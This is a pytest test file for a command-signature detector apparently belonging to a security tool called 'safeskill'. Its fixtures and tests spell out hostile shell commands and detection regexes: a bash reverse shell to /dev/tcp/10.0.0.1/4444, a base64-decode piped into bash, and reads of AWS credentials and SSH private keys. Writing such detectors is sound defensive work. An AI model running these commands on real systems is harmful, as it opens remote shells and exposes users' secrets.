"""Tests for signature matching."""

from __future__ import annotations

import tempfile
from pathlib import Path

import pytest
import yaml

from safeskill.models import AgentConfig, Environment, Severity, TrustMode
from safeskill.signatures import SignatureManager


@pytest.fixture
def config_dir():
    with tempfile.TemporaryDirectory() as tmpdir:
        yield tmpdir


@pytest.fixture
def sig_manager(config_dir: str):
    sigs = {
        "version": "1.0",
        "signatures": [
            {
                "id": "SIG-001",
                "name": "Bash reverse shell",
                "category": "reverse-shell",
                "severity": "critical",
                "patterns": [r"bash\s+-i\s+>&?\s*/dev/tcp/"],
            },
            {
                "id": "SIG-002",
                "name": "Base64 decode pipe",
                "category": "obfuscation",
                "severity": "high",
                "patterns": [r"base64\s+(-d|--decode)\s*\|\s*(bash|sh)"],
            },
            {
                "id": "SIG-003",
                "name": "Credential access",
                "category": "credential-access",
                "severity": "critical",
                "patterns": [
                    r"cat\s+.*\.aws/credentials",
                    r"cat\s+.*\.ssh/id_",
                ],
            },
        ],
    }
    with open(Path(config_dir) / "signatures.yaml", "w") as f:
        yaml.dump(sigs, f)

    config = AgentConfig(
        config_dir=config_dir,
        log_dir=tempfile.mkdtemp(),
    )
    sm = SignatureManager(config)
    sm.load()
    return sm


class TestSignatureMatching:
    def test_match_reverse_shell(self, sig_manager: SignatureManager):
        matches = sig_manager.match("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert len(matches) >= 1
        assert any(m.signature_id == "SIG-001" for m in matches)

    def test_match_base64_pipe(self, sig_manager: SignatureManager):
        matches = sig_manager.match("echo payload | base64 -d | bash")
        assert len(matches) >= 1
        assert any(m.signature_id == "SIG-002" for m in matches)

    def test_match_credential_access(self, sig_manager: SignatureManager):
        matches = sig_manager.match("cat ~/.aws/credentials")
        assert len(matches) >= 1
        assert any(m.signature_id == "SIG-003" for m in matches)

    def test_no_match_safe_command(self, sig_manager: SignatureManager):
        matches = sig_manager.match("ls -la /tmp")
        assert len(matches) == 0

    def test_no_match_normal_bash(self, sig_manager: SignatureManager):
        matches = sig_manager.match("bash script.sh")
        assert len(matches) == 0

    def test_case_insensitive(self, sig_manager: SignatureManager):
        matches = sig_manager.match("BASH -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert len(matches) >= 1


class TestSignatureInjection:
    def test_inject_new_signature(self, sig_manager: SignatureManager):
        initial_count = sig_manager.signature_count
        sig_manager.inject_signatures([
            {
                "id": "SIG-INJECTED",
                "name": "Injected test",
                "category": "test",
                "severity": "medium",
                "patterns": [r"injected_pattern"],
            }
        ])
        assert sig_manager.signature_count == initial_count + 1
        matches = sig_manager.match("run injected_pattern here")
        assert len(matches) == 1


class TestSignatureReload:
    def test_reload_detects_change(self, config_dir: str):
        config = AgentConfig(
            config_dir=config_dir,
            log_dir=tempfile.mkdtemp(),
        )
        sm = SignatureManager(config)
        sm.load()
        initial = sm.signature_count

        sigs = {
            "version": "1.0",
            "signatures": [
                {
                    "id": "SIG-NEW",
                    "name": "New sig",
                    "category": "test",
                    "severity": "low",
                    "patterns": [r"new_pattern"],
                }
            ],
        }
        with open(Path(config_dir) / "signatures.yaml", "w") as f:
            yaml.dump(sigs, f)

        reloaded = sm.reload_if_changed()
        assert reloaded is True
        assert sm.signature_count == 1
